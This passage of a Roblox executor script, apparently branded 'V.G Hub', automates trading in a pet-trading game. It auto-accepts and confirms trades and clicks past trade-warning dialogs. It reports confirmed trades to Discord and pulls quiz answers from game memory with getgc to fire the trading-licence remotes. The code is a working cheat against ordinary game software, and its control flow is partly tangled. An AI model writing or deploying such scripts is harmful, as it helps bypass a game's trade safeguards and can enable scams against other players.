        Parthner_Nick = game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Header.PartnerFrame.NameLabel.Text

        wait(.1)
    
        wait(.5)

        local A_1 = "#### ####"
        rand = math.floor(math.random(1, 2))
        
        if rand == 1 then
            A_1 = "#### ####"
        else
            A_1 = "#### ###"
        end

        local A_2 = "To " .. Parthner_Nick
    local Event = game.TextChatService.TextChannels.RBXGeneral:SendAsync(A_1)
        wait(.5)

        if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.ConfirmationFrame.PartnerOffer.Accepted.ImageTransparency == 1 then
            game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = true
        end

        while wait(.01) do
            
        for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Celestial2024Dialog.Buttons:GetDescendants()) do
            if button.Name == 'ButtonTemplate' then
                button_click(_G.button)
                button_click(_G.button)
                break
            end
        end
            _G.aboba = false
            for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons:GetDescendants()) do
                if button.Name == 'ButtonTemplate' then
                    if button.Face.TextLabel.Text == 'Accept' and string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'sent you a trade request') then
                        _G.aboba = true
                        break
                    end
                end
            end
            if _G.aboba == true then
                break
            end

            if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.ConfirmationFrame.PartnerOffer.Accepted.ImageTransparency ~= 1 then
                game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = true
            end


            if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
                break
            end

        for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Celestial2024Dialog.Buttons:GetDescendants()) do
            if button.Name == 'ButtonTemplate' then
                button_click(_G.button)
                button_click(_G.button)
                break
            end
        end

            _G.accepts = _G.accepts + 1
    
            if _G.accepts >= 18000 then
                _G.accepts = 0
                decline()
                break
            end
        
local ResultToCofrimed
local TradePassed = true
        function CheckSlots()
            local e = 1
            local a = 1
            local ItsEnd = false
            local CheckAgain = false
            local Checked = 0 
            TradePassed = true
                local ItsAccepted = true
                local MessageMassive = {}
                local MessageMassive2 = {}
                for i, v in pairs(game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Slots:GetDescendants()) do
                    if v.Name == 'ItemImageTemplate' then
                        for i, id in pairs(entries) do  
                            if v.Image == id.image then
                                game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = true  
                                ItsAccepted = false
                                MessageMassive[a] = id.name
                                a = a + 1
                                TradePassed = false
                                print("asd123sad123")
                                break
                            end                            
                        end
                    end
                end
                if TradePassed == false then
                    local A_1 = "Уберите из трейда | Remove from trade: " .. table.concat(MessageMassive, ", ")
                    local A_2 = "To " .. Parthner_Nick
                    local Event = game.TextChatService.TextChannels.RBXGeneral:SendAsync(A_1)
                end
                if TradePassed == true then
                for i, v in pairs(game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Slots:GetDescendants()) do
                    if v.Name == 'ItemImageTemplate' then
                        for i, id in pairs(entries) do  
                                local sam = v.Image
                                print("99999999999")
                                local stringgg = sam.sub(sam, 14, 25)   -- удалить с 3й позиции 2 символа, т. е. 'бо'
                                MessageMassive2[e] = "https://web.roblox.com/library/" .. stringgg
                                e = e + 1

                                break
                                end
                            end   
                        end 
                    local result2 = table.concat(MessageMassive2, ", ")
                    print(result2)
                    ResultToCofrimed = result2
                    sendTo2Discord(15753920, result2)
                    print("yeeeeeee")
                end
            end
    if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Accepted.ImageTransparency ~= 1 and _G.accepted == false then
                _G.accepted = true
                CheckSlots()
                local UnAccepted = false
                if TradePassed == false then
                    repeat wait(0.2) 
                        if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Accepted.ImageTransparency == 1 then
                            print("UnAccepted")
                            UnAccepted = true
                        end
                        if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
                            UnAccepted = true
                            print("breaked")
                            break
                        end
                    until UnAccepted == true
                        if UnAccepted == true then
                        if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
                            print("breaked")
                            break
                        end
                            repeat wait(0.2)
                                if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
                                    print("breaked")
                                    break
                                end
                                if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Accepted.ImageTransparency ~= 1 then
                                    _G.accepted = true
                                    CheckSlots()
                                    if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
                                        Phase2Reached = true
                                        print("breaked")
                                        break
                                    end
                                    local Phase2Reached = true
                                    break
                                end
                            until Phase2Reached == true
                    end
                end
                
                if TradePassed == true then

                if _G.declined == true then
                    _G.declined = false
                    break
                end

                if pcall(function ()
                    accept_button = game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.Accept
                end) then
                    wait(.01)
                    wait(5)
                    button_click(accept_button)
                    button_click(accept_button)
                    wait(1)
                    ItsAccepted = false
                    CheckAgain = false
                end

            
                while wait(.01) do
                    pcall(function()
                        if string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'This trade seems') then
                            button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
                                                    button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
                        end
                    end)

                        for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Celestial2024Dialog.Buttons:GetDescendants()) do
            if button.Name == 'ButtonTemplate' then
                button_click(_G.button)
                button_click(_G.button)
                break
            end
        end

                    pcall(function()
                        if string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'Remember:') then
                            button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
                             button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
                        end
                    end)
                    

                    _G.aboba = false
                    for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons:GetDescendants()) do
                        if button.Name == 'ButtonTemplate' then
                            if button.Face.TextLabel.Text == 'Accept' and string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'sent you a trade request') then
                                _G.aboba = true
                                break
                            end
                        end
                    end
                    if _G.aboba == true then
                        break
                    end
                    if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
                        break
                    end

                            for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Celestial2024Dialog.Buttons:GetDescendants()) do
            if button.Name == 'ButtonTemplate' then
                button_click(_G.button)
                button_click(_G.button)
                break
            end
        end
                -- Раньше тут были слоты, но из за их реформы скрипт не работал и их пришлось убрать
                --  _G.slots = 0
                --  for i,v in pairs(game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Slots:GetDescendants()) do
                --      if v.Name == 'ItemImageTemplate' then
        --                  _G.slots = _G.slots + 1
            --          end
            --      end

                --  if _G.slots == 0 then
--break
                --  end

                    _G.confirms = _G.confirms + 1
    
                    if _G.confirms > 18000 then
                        _G.confirms = 0
                        decline()
                        break
                    end

                    if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.ConfirmationFrame.PartnerOffer.Accepted.ImageTransparency ~= 1 then
                        _G.confirms = 0
                        _G.accepts = 0

                        if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
                            break
                        end
                        
                        if Parthner_Nick == "AinsOulgorn" then
                            
                            decline()
                            break
                        end
                        if Parthner_Nick == "SOMANYCHARACTERS" then
                                    
                            game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
                            break
                        end
                     
                        if Parthner_Nick == OldNick then
        
                            button_click(confirm_button)
                            button_click(confirm_button)
                            wait(1)
                            game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
                            print("confiremd")
                            sendToDiscord(15753920, ResultToCofrimed, true)
                        break
                        else
                        
                        pcall(function ()
                            confirm_button = game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.ConfirmationFrame.Accept
                            button_click(confirm_button)
                            button_click(confirm_button)
                            print(ResultToCofrimed)
                            OldNick = Parthner_Nick
                            print("confiremd")
                            sendToDiscord(15753920, ResultToCofrimed, true)

                        end)
                        game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
                        

        

                        break
                    end
                        end
                    end
                end
            end
        end
    end

    wait(1)
end
        end)
    end})
    local Dropdown = Tabs.Main:AddDropdown("s", {
        Title = "Players",
        Values = Ps,
        Multi = false,
        Default = 1,
    })

    Dropdown:SetValue("DekuDimz")

    Dropdown:OnChanged(function(Value)
        Playt = Value
    end)



    Tabs.Main:AddButton({Title = "Grab Trading Linence",Description = "Grabs Trading Linence",Callback = function()
        ReplicatedStorage.API:FindFirstChild("TradeAPI/BeginQuiz"):FireServer()
        for i,v in pairs(getgc(true)) do
            if type(v) == "table" and rawget(v,"question_index") then
                for i,v in pairs(v.quiz) do
                    ReplicatedStorage.API:FindFirstChild("TradeAPI/AnswerQuizQuestion"):FireServer(v.answer)
                end 
            end 
        end 
    end})
    local Dropdown = Tabs.Main:AddDropdown("s", {
        Title = "Stores",
        Values = Stores,
        Multi = false,
        Default = 1,
    })

    Dropdown:SetValue("")

    Dropdown:OnChanged(function(Value)
        Ass = Value
    end)
    Tabs.Main:AddButton({Title = "Go To Home",Description = "Goes to House",Callback = function()
        spawn(function()
            GoToHome()
            Player.Character.HumanoidRootPart.CFrame = Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA('Model'):GetModelCFrame():ToWorldSpace(CFrame.new(0, 0, -6)) 
        end)
    end})
    Tabs.Main:AddButton({Title = "Go To MainMap",Description = "Goes to MainMap",Callback = function()
        spawn(function()
            GoToMainMap()
            Player.Character.HumanoidRootPart.CFrame = Workspace.Interiors:FindFirstChildWhichIsA("Model"):GetModelCFrame():ToWorldSpace(CFrame.new(0, 0, -6))
            Player.Character.HumanoidRootPart.CFrame = CFrame.new(-247.35408, 17.3820152, -1518.88879) 
        end)
    end})

end
SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({})
InterfaceManager:SetFolder("FluentScriptHub")
SaveManager:SetFolder("FluentScriptHub/specific-game")

InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)


Window:SelectTab(1)

Fluent:Notify({
    Title = "V.G Hub",
    Content = "The script has been loaded.",
    Duration = 8
})

SaveManager:LoadAutoloadConfig()
